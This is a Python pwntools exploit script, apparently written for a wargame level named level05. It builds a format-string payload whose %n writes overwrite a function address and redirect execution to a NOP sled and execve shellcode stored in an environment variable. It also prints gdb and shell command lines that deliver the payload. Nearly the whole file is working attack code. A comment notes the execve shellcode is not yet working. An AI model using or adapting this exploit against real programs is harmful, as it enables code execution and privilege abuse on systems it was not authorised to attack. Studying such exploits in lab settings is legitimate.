from pwn import *


SHELLCODE_ADDRESS = 0xffffdbcd + len("PAYLOAD=") + 100


def bytes_to_hex_string(data):
    payload = ''.join([f'\\x{x:02x}' for x in data])
    return payload


def print_gcc_string(printf_pwn):
    gcc_string = r'run < <(printf "'
    print(gcc_string + bytes_to_hex_string(printf_pwn) + '")')
    print()


def print_bash_string(printf_pwn):

    shell_string = "python -c 'print(b\""
    env_end = f"\")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 PAYLOAD=$(python -c 'print b\"{(bytes_to_hex_string(create_payload()))}\"') DATA=/tmp/a /usr/bin/gdb /home/users/level05/level05"
    print(env_end[6:])
    print()
    env_end = env_end.replace("/usr/bin/gdb ", '')
    print(shell_string + bytes_to_hex_string(printf_pwn) + env_end)


def create_payload():
    executable_path = b"/tmp/a"
    padding = 1000
    asm_shellcode = f"""
        xor    ebx, ebx
    mov    bx, 0x4301
    dec    ebx
    shl    ebx, 16
    mov    bx, 0x612f
    push   ebx
    push   0x706d742f
    xor    eax, eax
    mov    al, 0xb
    xor    ebx, ebx
    lea    ebx, [esp]
    xor    ecx,ecx
    xor    edx,edx
    int    0x80 
    """
    # asm_shellcode = """
    # xor    ebx, ebx
    # xor    eax, eax
    # mov    al, 0x1
    # mov    bl, 42
    # int    0x80
    # """
    # TODO Shit above works only with exit. Need to solve what's wrong with execve
    nops = b'\x90' * padding
    shellcode = asm(
        asm_shellcode)
    return nops + shellcode + executable_path




# Here we're creating string which will right DWORD in our exit address
w1 = b'\xe0\x97\x04\x08' + b'JUNK'
w2 = b'\xe1\x97\x04\x08' + b'JUNK'
w3 = b'\xe2\x97\x04\x08' + b'JUNK'
w4 = b'\xe3\x97\x04\x08' + b'JUNK'

# This is our final address
b1, b2, b3, b4 = p32(SHELLCODE_ADDRESS)
# b1, b2, b3, b4 = p32(0xdeadbeef)

# And this is our final address paddings
n1 = 256 + b1 - 0x3e
n2 = 256*2 + b2 - n1 - 0x3e
n3 = 256*3 + b3 - n1 - n2 - 0x3e
n4 = 256*4 + b4 - n1 - n2 - n3 - 0x3e

# So, here we're creating our cool pwn string.
# It's messy because of last part, but it's binary exploit c'mon
# First - addresses in which we want to wright bytes
fmt = w1 + w2 + w3 + w4
# then we need to skip stack entries until our buffer
position = 10
fmt += b"%x" * (position - 2)
# And now we're adding amount of symbols before %n to get desired address
fmt += f'%{n1}x%n%{n2}x%n%{n3}x%n%{n4}x%n'.encode() + b"asdasdsadsa"

print_gcc_string(fmt)
print_bash_string(fmt)